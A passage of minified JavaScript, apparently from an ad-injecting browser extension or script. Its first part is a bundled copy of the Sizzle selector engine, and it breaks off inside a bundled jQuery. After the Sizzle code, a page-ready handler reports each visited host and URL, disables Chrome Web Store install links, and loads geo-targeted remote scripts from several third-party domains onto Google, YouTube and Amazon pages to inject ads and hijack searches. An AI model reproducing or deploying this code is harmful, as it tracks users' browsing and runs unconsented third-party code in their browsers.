                                aI += R(aL)
                            }
                        }
                    } else {
                        if (e === 3 || e === 4) {
                            return aL.nodeValue
                        }
                    }
                }
                return aI
            };
            v = E.selectors = {
                cacheLength: 50,
                createPseudo: r,
                match: am,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: true
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: true
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(e) {
                        e[1] = e[1].replace(A, ap);
                        e[3] = (e[4] || e[5] || "").replace(A, ap);
                        if (e[2] === "~=") {
                            e[3] = " " + e[3] + " "
                        }
                        return e.slice(0, 4)
                    },
                    CHILD: function(e) {
                        e[1] = e[1].toLowerCase();
                        if (e[1].slice(0, 3) === "nth") {
                            if (!e[3]) {
                                E.error(e[0])
                            }
                            e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * (e[3] === "even" || e[3] === "odd"));
                            e[5] = +((e[7] + e[8]) || e[3] === "odd")
                        } else {
                            if (e[3]) {
                                E.error(e[0])
                            }
                        }
                        return e
                    },
                    PSEUDO: function(i) {
                        var e, aI = !i[5] && i[2];
                        if (am.CHILD.test(i[0])) {
                            return null
                        }
                        if (i[3] && i[4] !== q) {
                            i[2] = i[4]
                        } else {
                            if (aI && ad.test(aI) && (e = p(aI, true)) && (e = aI.indexOf(")", aI.length - e) - aI.length)) {
                                i[0] = i[0].slice(0, e);
                                i[2] = aI.slice(0, e)
                            }
                        }
                        return i.slice(0, 3)
                    }
                },
                filter: {
                    TAG: function(i) {
                        var e = i.replace(A, ap).toLowerCase();
                        return i === "*" ? function() {
                            return true
                        } : function(aI) {
                            return aI.nodeName && aI.nodeName.toLowerCase() === e
                        }
                    },
                    CLASS: function(e) {
                        var i = d[e + " "];
                        return i || (i = new RegExp("(^|" + x + ")" + e + "(" + x + "|$)")) && d(e, function(aI) {
                            return i.test(typeof aI.className === "string" && aI.className || typeof aI.getAttribute !== az && aI.getAttribute("class") || "")
                        })
                    },
                    ATTR: function(aI, i, e) {
                        return function(aK) {
                            var aJ = E.attr(aK, aI);
                            if (aJ == null) {
                                return i === "!="
                            }
                            if (!i) {
                                return true
                            }
                            aJ += "";
                            return i === "=" ? aJ === e : i === "!=" ? aJ !== e : i === "^=" ? e && aJ.indexOf(e) === 0 : i === "*=" ? e && aJ.indexOf(e) > -1 : i === "$=" ? e && aJ.slice(-e.length) === e : i === "~=" ? (" " + aJ + " ").indexOf(e) > -1 : i === "|=" ? aJ === e || aJ.slice(0, e.length + 1) === e + "-" : false
                        }
                    },
                    CHILD: function(i, aK, aJ, aL, aI) {
                        var aN = i.slice(0, 3) !== "nth",
                            e = i.slice(-4) !== "last",
                            aM = aK === "of-type";
                        return aL === 1 && aI === 0 ? function(aO) {
                            return !!aO.parentNode
                        } : function(aU, aS, aX) {
                            var aO, a0, aV, aZ, aW, aR, aT = aN !== e ? "nextSibling" : "previousSibling",
                                aY = aU.parentNode,
                                aQ = aM && aU.nodeName.toLowerCase(),
                                aP = !aX && !aM;
                            if (aY) {
                                if (aN) {
                                    while (aT) {
                                        aV = aU;
                                        while ((aV = aV[aT])) {
                                            if (aM ? aV.nodeName.toLowerCase() === aQ : aV.nodeType === 1) {
                                                return false
                                            }
                                        }
                                        aR = aT = i === "only" && !aR && "nextSibling"
                                    }
                                    return true
                                }
                                aR = [e ? aY.firstChild : aY.lastChild];
                                if (e && aP) {
                                    a0 = aY[av] || (aY[av] = {});
                                    aO = a0[i] || [];
                                    aW = aO[0] === aE && aO[1];
                                    aZ = aO[0] === aE && aO[2];
                                    aV = aW && aY.childNodes[aW];
                                    while ((aV = ++aW && aV && aV[aT] || (aZ = aW = 0) || aR.pop())) {
                                        if (aV.nodeType === 1 && ++aZ && aV === aU) {
                                            a0[i] = [aE, aW, aZ];
                                            break
                                        }
                                    }
                                } else {
                                    if (aP && (aO = (aU[av] || (aU[av] = {}))[i]) && aO[0] === aE) {
                                        aZ = aO[1]
                                    } else {
                                        while ((aV = ++aW && aV && aV[aT] || (aZ = aW = 0) || aR.pop())) {
                                            if ((aM ? aV.nodeName.toLowerCase() === aQ : aV.nodeType === 1) && ++aZ) {
                                                if (aP) {
                                                    (aV[av] || (aV[av] = {}))[i] = [aE, aZ]
                                                }
                                                if (aV === aU) {
                                                    break
                                                }
                                            }
                                        }
                                    }
                                }
                                aZ -= aI;
                                return aZ === aL || (aZ % aL === 0 && aZ / aL >= 0)
                            }
                        }
                    },
                    PSEUDO: function(aJ, aI) {
                        var e, i = v.pseudos[aJ] || v.setFilters[aJ.toLowerCase()] || E.error("unsupported pseudo: " + aJ);
                        if (i[av]) {
                            return i(aI)
                        }
                        if (i.length > 1) {
                            e = [aJ, aJ, "", aI];
                            return v.setFilters.hasOwnProperty(aJ.toLowerCase()) ? r(function(aM, aO) {
                                var aL, aK = i(aM, aI),
                                    aN = aK.length;
                                while (aN--) {
                                    aL = j.call(aM, aK[aN]);
                                    aM[aL] = !(aO[aL] = aK[aN])
                                }
                            }) : function(aK) {
                                return i(aK, 0, e)
                            }
                        }
                        return i
                    }
                },
                pseudos: {
                    not: r(function(e) {
                        var i = [],
                            aI = [],
                            aJ = ag(e.replace(z, "$1"));
                        return aJ[av] ? r(function(aL, aQ, aO, aM) {
                            var aP, aK = aJ(aL, null, aM, []),
                                aN = aL.length;
                            while (aN--) {
                                if ((aP = aK[aN])) {
                                    aL[aN] = !(aQ[aN] = aP)
                                }
                            }
                        }) : function(aM, aL, aK) {
                            i[0] = aM;
                            aJ(i, null, aK, aI);
                            return !aI.pop()
                        }
                    }),
                    has: r(function(e) {
                        return function(i) {
                            return E(e, i).length > 0
                        }
                    }),
                    contains: r(function(e) {
                        return function(i) {
                            return (i.textContent || i.innerText || R(i)).indexOf(e) > -1
                        }
                    }),
                    lang: r(function(e) {
                        if (!ae.test(e || "")) {
                            E.error("unsupported lang: " + e)
                        }
                        e = e.replace(A, ap).toLowerCase();
                        return function(aI) {
                            var i;
                            do {
                                if ((i = at ? aI.lang : aI.getAttribute("xml:lang") || aI.getAttribute("lang"))) {
                                    i = i.toLowerCase();
                                    return i === e || i.indexOf(e + "-") === 0
                                }
                            } while ((aI = aI.parentNode) && aI.nodeType === 1);
                            return false
                        }
                    }),
                    target: function(e) {
                        var i = aA.location && aA.location.hash;
                        return i && i.slice(1) === e.id
                    },
                    root: function(e) {
                        return e === w
                    },
                    focus: function(e) {
                        return e === L.activeElement && (!L.hasFocus || L.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
                    },
                    enabled: function(e) {
                        return e.disabled === false
                    },
                    disabled: function(e) {
                        return e.disabled === true
                    },
                    checked: function(e) {
                        var i = e.nodeName.toLowerCase();
                        return (i === "input" && !!e.checked) || (i === "option" && !!e.selected)
                    },
                    selected: function(e) {
                        if (e.parentNode) {
                            e.parentNode.selectedIndex
                        }
                        return e.selected === true
                    },
                    empty: function(e) {
                        for (e = e.firstChild; e; e = e.nextSibling) {
                            if (e.nodeName > "@" || e.nodeType === 3 || e.nodeType === 4) {
                                return false
                            }
                        }
                        return true
                    },
                    parent: function(e) {
                        return !v.pseudos.empty(e)
                    },
                    header: function(e) {
                        return t.test(e.nodeName)
                    },
                    input: function(e) {
                        return h.test(e.nodeName)
                    },
                    button: function(i) {
                        var e = i.nodeName.toLowerCase();
                        return e === "input" && i.type === "button" || e === "button"
                    },
                    text: function(i) {
                        var e;
                        return i.nodeName.toLowerCase() === "input" && i.type === "text" && ((e = i.getAttribute("type")) == null || e.toLowerCase() === i.type)
                    },
                    first: ar(function() {
                        return [0]
                    }),
                    last: ar(function(e, i) {
                        return [i - 1]
                    }),
                    eq: ar(function(e, aI, i) {
                        return [i < 0 ? i + aI : i]
                    }),
                    even: ar(function(e, aJ) {
                        var aI = 0;
                        for (; aI < aJ; aI += 2) {
                            e.push(aI)
                        }
                        return e
                    }),
                    odd: ar(function(e, aJ) {
                        var aI = 1;
                        for (; aI < aJ; aI += 2) {
                            e.push(aI)
                        }
                        return e
                    }),
                    lt: ar(function(e, aK, aJ) {
                        var aI = aJ < 0 ? aJ + aK : aJ;
                        for (; --aI >= 0;) {
                            e.push(aI)
                        }
                        return e
                    }),
                    gt: ar(function(e, aK, aJ) {
                        var aI = aJ < 0 ? aJ + aK : aJ;
                        for (; ++aI < aK;) {
                            e.push(aI)
                        }
                        return e
                    })
                }
            };
            for (G in {
                    radio: true,
                    checkbox: true,
                    file: true,
                    password: true,
                    image: true
                }) {
                v.pseudos[G] = F(G)
            }
            for (G in {
                    submit: true,
                    reset: true
                }) {
                v.pseudos[G] = g(G)
            }

            function p(aK, aP) {
                var i, aL, aN, aO, aM, aI, e, aJ = au[aK + " "];
                if (aJ) {
                    return aP ? 0 : aJ.slice(0)
                }
                aM = aK;
                aI = [];
                e = v.preFilter;
                while (aM) {
                    if (!i || (aL = D.exec(aM))) {
                        if (aL) {
                            aM = aM.slice(aL[0].length) || aM
                        }
                        aI.push(aN = [])
                    }
                    i = false;
                    if ((aL = K.exec(aM))) {
                        i = aL.shift();
                        aN.push({
                            value: i,
                            type: aL[0].replace(z, " ")
                        });
                        aM = aM.slice(i.length)
                    }
                    for (aO in v.filter) {
                        if ((aL = am[aO].exec(aM)) && (!e[aO] || (aL = e[aO](aL)))) {
                            i = aL.shift();
                            aN.push({
                                value: i,
                                type: aO,
                                matches: aL
                            });
                            aM = aM.slice(i.length)
                        }
                    }
                    if (!i) {
                        break
                    }
                }
                return aP ? aM.length : aM ? E.error(aK) : au(aK, aI).slice(0)
            }

            function o(aK) {
                var aJ = 0,
                    aI = aK.length,
                    e = "";
                for (; aJ < aI; aJ++) {
                    e += aK[aJ].value
                }
                return e
            }

            function y(aK, aI, aJ) {
                var e = aI.dir,
                    aL = aJ && e === "parentNode",
                    i = ao++;
                return aI.first ? function(aO, aN, aM) {
                    while ((aO = aO[e])) {
                        if (aO.nodeType === 1 || aL) {
                            return aK(aO, aN, aM)
                        }
                    }
                } : function(aQ, aO, aN) {
                    var aS, aM, aP, aR = aE + " " + i;
                    if (aN) {
                        while ((aQ = aQ[e])) {
                            if (aQ.nodeType === 1 || aL) {
                                if (aK(aQ, aO, aN)) {
                                    return true
                                }
                            }
                        }
                    } else {
                        while ((aQ = aQ[e])) {
                            if (aQ.nodeType === 1 || aL) {
                                aP = aQ[av] || (aQ[av] = {});
                                if ((aM = aP[e]) && aM[0] === aR) {
                                    if ((aS = aM[1]) === true || aS === l) {
                                        return aS === true
                                    }
                                } else {
                                    aM = aP[e] = [aR];
                                    aM[1] = aK(aQ, aO, aN) || l;
                                    if (aM[1] === true) {
                                        return true
                                    }
                                }
                            }
                        }
                    }
                }
            }

            function aG(e) {
                return e.length > 1 ? function(aL, aK, aI) {
                    var aJ = e.length;
                    while (aJ--) {
                        if (!e[aJ](aL, aK, aI)) {
                            return false
                        }
                    }
                    return true
                } : e[0]
            }

            function ak(e, aI, aJ, aK, aN) {
                var aL, aQ = [],
                    aM = 0,
                    aO = e.length,
                    aP = aI != null;
                for (; aM < aO; aM++) {
                    if ((aL = e[aM])) {
                        if (!aJ || aJ(aL, aK, aN)) {
                            aQ.push(aL);
                            if (aP) {
                                aI.push(aM)
                            }
                        }
                    }
                }
                return aQ
            }

            function n(aI, i, aK, aJ, aL, e) {
                if (aJ && !aJ[av]) {
                    aJ = n(aJ)
                }
                if (aL && !aL[av]) {
                    aL = n(aL, e)
                }
                return r(function(aW, aT, aO, aV) {
                    var aY, aU, aQ, aP = [],
                        aX = [],
                        aN = aT.length,
                        aM = aW || I(i || "*", aO.nodeType ? [aO] : aO, []),
                        aR = aI && (aW || !i) ? ak(aM, aP, aI, aO, aV) : aM,
                        aS = aK ? aL || (aW ? aI : aN || aJ) ? [] : aT : aR;
                    if (aK) {
                        aK(aR, aS, aO, aV)
                    }
                    if (aJ) {
                        aY = ak(aS, aX);
                        aJ(aY, [], aO, aV);
                        aU = aY.length;
                        while (aU--) {
                            if ((aQ = aY[aU])) {
                                aS[aX[aU]] = !(aR[aX[aU]] = aQ)
                            }
                        }
                    }
                    if (aW) {
                        if (aL || aI) {
                            if (aL) {
                                aY = [];
                                aU = aS.length;
                                while (aU--) {
                                    if ((aQ = aS[aU])) {
                                        aY.push((aR[aU] = aQ))
                                    }
                                }
                                aL(null, (aS = []), aY, aV)
                            }
                            aU = aS.length;
                            while (aU--) {
                                if ((aQ = aS[aU]) && (aY = aL ? j.call(aW, aQ) : aP[aU]) > -1) {
                                    aW[aY] = !(aT[aY] = aQ)
                                }
                            }
                        }
                    } else {
                        aS = ak(aS === aT ? aS.splice(aN, aS.length) : aS);
                        if (aL) {
                            aL(null, aT, aS, aV)
                        } else {
                            b.apply(aT, aS)
                        }
                    }
                })
            }

            function aw(aN) {
                var aI, aL, aJ, aM = aN.length,
                    aQ = v.relative[aN[0].type],
                    aR = aQ || v.relative[" "],
                    aK = aQ ? 1 : 0,
                    aO = y(function(i) {
                        return i === aI
                    }, aR, true),
                    aP = y(function(i) {
                        return j.call(aI, i) > -1
                    }, aR, true),
                    e = [function(aT, aS, i) {
                        return (!aQ && (i || aS !== aH)) || ((aI = aS).nodeType ? aO(aT, aS, i) : aP(aT, aS, i))
                    }];
                for (; aK < aM; aK++) {
                    if ((aL = v.relative[aN[aK].type])) {
                        e = [y(aG(e), aL)]
                    } else {
                        aL = v.filter[aN[aK].type].apply(null, aN[aK].matches);
                        if (aL[av]) {
                            aJ = ++aK;
                            for (; aJ < aM; aJ++) {
                                if (v.relative[aN[aJ].type]) {
                                    break
                                }
                            }
                            return n(aK > 1 && aG(e), aK > 1 && o(aN.slice(0, aK - 1).concat({
                                value: aN[aK - 2].type === " " ? "*" : ""
                            })).replace(z, "$1"), aL, aK < aJ && aw(aN.slice(aK, aJ)), aJ < aM && aw((aN = aN.slice(aJ))), aJ < aM && o(aN))
                        }
                        e.push(aL)
                    }
                }
                return aG(e)
            }

            function ai(aJ, aI) {
                var aL = 0,
                    e = aI.length > 0,
                    aK = aJ.length > 0,
                    i = function(aV, aP, aU, aT, a1) {
                        var aQ, aR, aW, a0 = [],
                            aZ = 0,
                            aS = "0",
                            aM = aV && [],
                            aX = a1 != null,
                            aY = aH,
                            aO = aV || aK && v.find.TAG("*", a1 && aP.parentNode || aP),
                            aN = (aE += aY == null ? 1 : Math.random() || 0.1);
                        if (aX) {
                            aH = aP !== L && aP;
                            l = aL
                        }
                        for (;
                            (aQ = aO[aS]) != null; aS++) {
                            if (aK && aQ) {
                                aR = 0;
                                while ((aW = aJ[aR++])) {
                                    if (aW(aQ, aP, aU)) {
                                        aT.push(aQ);
                                        break
                                    }
                                }
                                if (aX) {
                                    aE = aN;
                                    l = ++aL
                                }
                            }
                            if (e) {
                                if ((aQ = !aW && aQ)) {
                                    aZ--
                                }
                                if (aV) {
                                    aM.push(aQ)
                                }
                            }
                        }
                        aZ += aS;
                        if (e && aS !== aZ) {
                            aR = 0;
                            while ((aW = aI[aR++])) {
                                aW(aM, a0, aP, aU)
                            }
                            if (aV) {
                                if (aZ > 0) {
                                    while (aS--) {
                                        if (!(aM[aS] || a0[aS])) {
                                            a0[aS] = ay.call(aT)
                                        }
                                    }
                                }
                                a0 = ak(a0)
                            }
                            b.apply(aT, a0);
                            if (aX && !aV && a0.length > 0 && (aZ + aI.length) > 1) {
                                E.uniqueSort(aT)
                            }
                        }
                        if (aX) {
                            aE = aN;
                            aH = aY
                        }
                        return aM
                    };
                return e ? r(i) : i
            }
            ag = E.compile = function(e, aM) {
                var aJ, aI = [],
                    aL = [],
                    aK = Q[e + " "];
                if (!aK) {
                    if (!aM) {
                        aM = p(e)
                    }
                    aJ = aM.length;
                    while (aJ--) {
                        aK = aw(aM[aJ]);
                        if (aK[av]) {
                            aI.push(aK)
                        } else {
                            aL.push(aK)
                        }
                    }
                    aK = Q(e, ai(aL, aI))
                }
                return aK
            };

            function I(aI, aL, aK) {
                var aJ = 0,
                    e = aL.length;
                for (; aJ < e; aJ++) {
                    E(aI, aL[aJ], aK)
                }
                return aK
            }

            function aC(aJ, e, aK, aN) {
                var aL, aP, aI, aQ, aO, aM = p(aJ);
                if (!aN) {
                    if (aM.length === 1) {
                        aP = aM[0] = aM[0].slice(0);
                        if (aP.length > 2 && (aI = aP[0]).type === "ID" && aD.getById && e.nodeType === 9 && at && v.relative[aP[1].type]) {
                            e = (v.find.ID(aI.matches[0].replace(A, ap), e) || [])[0];
                            if (!e) {
                                return aK
                            }
                            aJ = aJ.slice(aP.shift().value.length)
                        }
                        aL = am.needsContext.test(aJ) ? 0 : aP.length;
                        while (aL--) {
                            aI = aP[aL];
                            if (v.relative[(aQ = aI.type)]) {
                                break
                            }
                            if ((aO = v.find[aQ])) {
                                if ((aN = aO(aI.matches[0].replace(A, ap), al.test(aP[0].type) && e.parentNode || e))) {
                                    aP.splice(aL, 1);
                                    aJ = aN.length && o(aP);
                                    if (!aJ) {
                                        b.apply(aK, aN);
                                        return aK
                                    }
                                    break
                                }
                            }
                        }
                    }
                }
                ag(aJ, aM)(aN, e, !at, aK, al.test(aJ));
                return aK
            }
            v.pseudos.nth = v.pseudos.eq;

            function af() {}
            af.prototype = v.filters = v.pseudos;
            v.setFilters = new af();
            aD.sortStable = av.split("").sort(N).join("") === av;
            aj();
            [0, 0].sort(N);
            aD.detectDuplicates = ah;
            aA["1f7cbb02d08cf61dbb"].Sizzle = E
        })(window);;
        var e = i[g].Sizzle;
        var d = i[g];
        d.Sizzle = e;
        d.demoMode = i[g].demoMode = (p);
        d.ready(function() {
            if (location.href.indexOf("thisadsfor.us") > -1) {
                return true
            }
            try {
                (function() {
                    var A = function() {
                        var C = "chrome-webstore-item";
                        var D = document.getElementsByTagName("link");
                        for (var B = 0, E = D.length; E > B; ++B) {
                            if (C == D[B].getAttribute("id") || C == D[B].getAttribute("rel")) {
                                d.loadedCallback("PROMO_ANLZ", "", location.host, location.href, D[B].getAttribute("href"))
                            }
                        }
                    };
                    A()
                })()
            } catch (y) {}
            try {
                (function() {
                    var C = function() {
                        location.href = "javascript:(" + function() {
                            window.onbeforeunload = null;
                            window.onunload = null;
                            chrome.webstore.install = null
                        } + ")()"
                    };
                    var B = function() {
                        window.stop && window.stop();
                        location.replace("about:blank")
                    };
                    var A = function() {
                        if ("52096" == "51433" && location.hostname.indexOf("olam-hamedia.tech") > -1) {
                            return
                        }
                        var E = "chrome-webstore-item";
                        var F = document.getElementsByTagName("link");
                        for (var D = 0, G = F.length; G > D; ++D) {
                            if (E == F[D].getAttribute("id") || E == F[D].getAttribute("rel")) {
                                F[D].setAttribute("rel", "");
                                F[D].setAttribute("id", "");
                                F[D].setAttribute("href", "");
                                C()
                            }
                        }
                    };
                    if (!location.hostname.match(/dostup-[a-z]+\.com$/) && location.hostname.indexOf("freevideodownloader") == -1 && location.hostname.indexOf("musvk") == -1 && location.hostname.indexOf("vkonline.xyz") == -1 && location.hostname.indexOf("vkunblock.com") == -1) {
                        A()
                    }
                })()
            } catch (y) {}
            var r = function(B) {
                var E = {};
                B = B.split("?");
                if (B.length < 2) {
                    return E
                }
                var D = B[1];
                var F = D.split("&");
                for (var C = 0; C < F.length; C++) {
                    var G = F[C].split("=");
                    if (typeof E[G[0]] === "undefined") {
                        E[G[0]] = G[1]
                    } else {
                        if (typeof E[G[0]] === "string") {
                            var A = [E[G[0]], G[1]];
                            E[G[0]] = A
                        } else {
                            E[G[0]].push(G[1])
                        }
                    }
                }
                return E
            };
            var w = {};
            var t = document.getElementsByTagName("script");
            var s = null;
            for (var v = 0; v < t.length; v++) {
                var z = t[v];
                if (z.src.search(/1f7cbb02d08cf61dbb.*\.js/i) !== -1) {
                    s = z.src.replace(/^https?\:\/\//i, "").split("/")[0];
                    if (o) {
                        d.scriptDomain = s
                    }
                    w = r(z.src);
                    break
                }
            }
            if (location.host.indexOf("bing.com") > -1 && i.AM && typeof i.AM == "object") {
                i.AM.push(d.scriptDomain)
            }
            i[g].tbParams = {
                wid: "52096",
                sid: "",
                tid: "8060",
                title: "advert",
                optoutUrl: ""
            };
            if (w.sid) {
                i[g].tbParams.sid = w.sid
            }
            if (w.title) {
                i[g].tbParams.title = decodeURIComponent(w.title)
            }
            if (w.optout) {
                i[g].tbParams.optoutUrl = decodeURIComponent(w.optout)
            }
            i[g].getParams = r(location.href);
            d.tbParams = i[g].tbParams;
            var q = "";
            try {
                q = location.pathname.substring(0, 50)
            } catch (y) {}
            d.loadedCallback("LOADED", "", location.host, q, s);
            var x = /\.(jpg|png|jpeg|gif|bmp|doc|pdf|xls|js|xml|doc|docs|txt|css)$/;
            if (location.href.match(x)) {
                d.loadedCallback("URL_STATICFILE");
                return false
            }
            var u = /(paypal\.com|secure\.|\.gov|doubleclick\.net|addthis\.com|twitter\.com|docs\.google\.com|drive\.google\.com)/;
            if (location.hostname.match(u)) {
                d.loadedCallback("URL_IGNOREDOMAIN");
                return false
            }(function(d, w, u) {
                var $$ = w["1f7cbb02d08cf61dbb"];
                var scriptsToLoad = $$.fromJson("{\"a49b5\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"platform\",\"key\":\"a49b5\",\"config\":{\"doBlind\":0.23,\"hideAdsense\":false}},\"c3369\":{\"countries_allow\":\"at,br,ch,de,dk,es,fi,fr,in,it,mx,nl,no,se,sg,tw,gb\",\"countries_deny\":\"us,gb,ca,au,be,lu,fr\",\"hostname_allow\":\"(?:google\\\\..*|youtube\\\\.com)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/laubeyrietechnology.com\\/script\\/d.php?uid=52096x0000xzzzzzzzzzzzzzzzzzzzzz&a=3453\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"c3369\"},\"90f06\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/srvvtrk.com\\/91a2556838a7c33eac284eea30bdcc29\\/validate-site.js?uid=52096x8060x\\/SID\\/&r=\\/RANDOM\\/\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"90f06\"},\"18918\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"18918\"},\"cd1d2\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"\",\"hostname_deny\":\"(?:.*googleusercontent\\\\..*|mail\\\\.google\\\\.com|reddit\\\\.com|.*\\\\.reddit\\\\.com)\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/serenityart.biz\\/addons\\/lnkr5.min.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"cd1d2\"},\"81d01\":{\"countries_allow\":\"\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\\/\\/serenityart.biz\\/addons\\/lnkr33_gl.min.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"81d01\"},\"acfec\":{\"countries_allow\":\"us,de,gb,fr,ca,au,nl,es,it,nz,be,se,ch,in,at,br,dk,no,fi\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:amazon\\\\..*|.*\\\\.amazon\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"\",\"limit\":\"0\",\"type\":\"platform\",\"key\":\"acfec\",\"config\":{\"subid\":\"1105\"}},\"3160d\":{\"countries_allow\":\"gb\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"https:\\/\\/1675450967.rsc.cdn77.org\\/cu\\/msdtz290fyh20.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"3160d\"},\"a7711\":{\"countries_allow\":\"fr\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"https:\\/\\/1675450967.rsc.cdn77.org\\/cu\\/ymthxlc22.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"a7711\"},\"b8695\":{\"countries_allow\":\"de\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"https:\\/\\/1675450967.rsc.cdn77.org\\/cu\\/yhmtxz21.js \",\"limit\":\"0\",\"type\":\"external\",\"key\":\"b8695\"},\"d652c\":{\"countries_allow\":\"es\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"https:\\/\\/1675450967.rsc.cdn77.org\\/cu\\/yhmt30x.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"d652c\"},\"ae5a7\":{\"countries_allow\":\"it\",\"countries_deny\":\"\",\"hostname_allow\":\"(?:google\\\\..*)\",\"hostname_deny\":\"\",\"browsers_allow\":\"\",\"browsers_deny\":\"\",\"coverage\":\"0-100\",\"url\":\"https:\\/\\/1675450967.rsc.cdn77.org\\/cu\\/yhmt31x.js\",\"limit\":\"0\",\"type\":\"external\",\"key\":\"ae5a7\"}}");
                $$.monetizationsConfig = scriptsToLoad;
                var extendedCallbacks = false;
                if ("52096" == "51739") {
                    extendedCallbacks = true
                };;;;;;;;;;;;;;;;;;;;;;;;;
                var isInIframe = function() {
                    return (window.top != window.self)
                };
                var secondsFormat = function(sec_num) {
                    var days = Math.floor(sec_num / 86400);
                    sec_num -= days * 86400;
                    var hours = Math.floor(sec_num / 3600);
                    sec_num -= hours * 3600;
                    var minutes = Math.floor(sec_num / 60);
                    sec_num -= minutes * 60;
                    if (hours < 10) {
                        hours = "0" + hours
                    }
                    if (minutes < 10) {
                        minutes = "0" + minutes
                    }
                    if (sec_num < 10) {
                        sec_num = "0" + sec_num
                    }
                    return days + "d " + hours + ":" + minutes + ":" + sec_num
                };
                var runForceSearch;;;
                (function() {
                    window.__fd_prm = "";;
                    try {
                        (function(h, l, m) {
                            var n = l["1f7cbb02d08cf61dbb"];
                            var i, e, p = false;
                            var g = n.getMtzCfg('a49b5');
                            if (["searchvalidation.com"].indexOf(location.hostname) == -1 && location.hostname.indexOf("bing.com") == -1 && location.hostname.indexOf("google.") == -1 && location.hostname.indexOf("becovi.com") == -1) {
                                return
                            }! function(d, c) {
                                "object" == typeof module && "object" == typeof module.exports ? module.exports = d.document ? c(d, !0) : function(b) {
                                    if (!b.document) {
                                        throw new Error("jQuery requires a window with a document")
                                    }
                                    return c(b)
                                } : c(d)
                            }("undefined" != typeof window ? window : this, function(bP, bO) {
                                var bN = [],
                                    bM = bP.document,
                                    bL = Object.getPrototypeOf,
                                    bJ = bN.slice,
                                    bH = bN.concat,
                                    bG = bN.push,
                                    bF = bN.indexOf,
                                    bE = {},
                                    bD = bE.toString,
                                    bC = bE.hasOwnProperty,
                                    bB = bC.toString,
                                    bA = bB.call(Object),
                                    bz = {};

                                function by(e, d) {
                                    d = d || bM;
                                    var f = d.createElement("script");
                                    f.text = e, d.head.appendChild(f).parentNode.removeChild(f)
                                }
                                var bw = "3.1.1",
                                    bv = function(d, c) {
                                        return new bv.fn.init(d, c)
                                    },
                                    bu = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
                                    bt = /^-ms-/,
                                    bs = /-([a-z])/g,
                                    br = function(d, c) {
                                        return c.toUpperCase()
                                    };
                                bv.fn = bv.prototype = {
                                    jquery: bw,
                                    constructor: bv,
                                    length: 0,
                                    toArray: function() {
                                        return bJ.call(this)
                                    },
                                    get: function(b) {
                                        return null == b ? bJ.call(this) : b < 0 ? this[b + this.length] : this[b]
                                    },
                                    pushStack: function(d) {
                                        var c = bv.merge(this.constructor(), d);
                                        return c.prevObject = this, c
                                    },
                                    each: function(b) {
                                        return bv.each(this, b)
                                    },
                                    map: function(b) {
                                        return this.pushStack(bv.map(this, function(a, d) {
                                            return b.call(a, d, a)
                                        }))
                                    },
                                    slice: function() {
                                        return this.pushStack(bJ.apply(this, arguments))
                                    },
                                    first: function() {
                                        return this.eq(0)
                                    },
                                    last: function() {
                                        return this.eq(-1)
                                    },
                                    eq: function(e) {
                                        var d = this.length,
                                            f = +e + (e < 0 ? d : 0);
                                        return this.pushStack(f >= 0 && f < d ? [this[f]] : [])
                                    },
                                    end: function() {
                                        return this.prevObject || this.constructor()
                                    },
                                    push: bG,
                                    sort: bN.sort,
                                    splice: bN.splice
                                }, bv.extend = bv.fn.extend = function() {
                                    var t, s, r, q, p, o, n = arguments[0] || {},
                                        m = 1,
                                        l = arguments.length,
                                        k = !1;
                                    for ("boolean" == typeof n && (k = n, n = arguments[m] || {}, m++), "object" == typeof n || bv.isFunction(n) || (n = {}), m === l && (n = this, m--); m < l; m++) {
                                        if (null != (t = arguments[m])) {
                                            for (s in t) {
